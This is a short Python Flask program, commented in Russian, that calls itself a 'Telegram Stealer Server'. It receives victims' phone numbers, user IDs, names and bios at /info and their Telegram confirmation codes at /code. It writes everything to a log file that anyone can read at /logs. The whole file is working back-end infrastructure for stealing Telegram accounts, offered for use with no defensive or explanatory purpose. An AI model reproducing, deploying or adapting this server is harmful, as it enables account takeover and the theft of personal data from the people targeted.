from flask import Flask, request, jsonify
import json
import os
from datetime import datetime

app = Flask(__name__)

# Логирование в файл на Render (опционально)
LOG_FILE = "logs.txt"

def log_data(endpoint, data):
    """Сохраняет данные в консоль и в файл (если нужно)"""
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    msg = f"[{timestamp}] {endpoint}: {json.dumps(data, ensure_ascii=False)}"
    print(msg)  # Покажет в логах Render
    
    # Если нужно сохранять в файл (можно закомментировать)
    with open(LOG_FILE, "a", encoding="utf-8") as f:
        f.write(msg + "\n")

@app.route('/info', methods=['POST'])
def info():
    """Принимает данные о жертве: номер, ID, имя, био"""
    try:
        data = request.get_json()
        if not data:
            return jsonify({'error': 'No JSON'}), 400
        
        log_data('INFO', data)
        return jsonify({'status': 'ok'}), 200
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/code', methods=['POST'])
def code():
    """Принимает код подтверждения"""
    try:
        data = request.get_json()
        if not data:
            return jsonify({'error': 'No JSON'}), 400
        
        log_data('CODE', data)
        return jsonify({'status': 'ok'}), 200
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/', methods=['GET'])
def index():
    """Проверка, что сервер работает"""
    return "Telegram Stealer Server is running."

@app.route('/logs', methods=['GET'])
def get_logs():
    """Опционально: просмотр логов через браузер"""
    try:
        with open(LOG_FILE, "r", encoding="utf-8") as f:
            content = f.read()
        return f"<pre>{content}</pre>", 200
    except:
        return "Logs not found", 404

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port, debug=False)
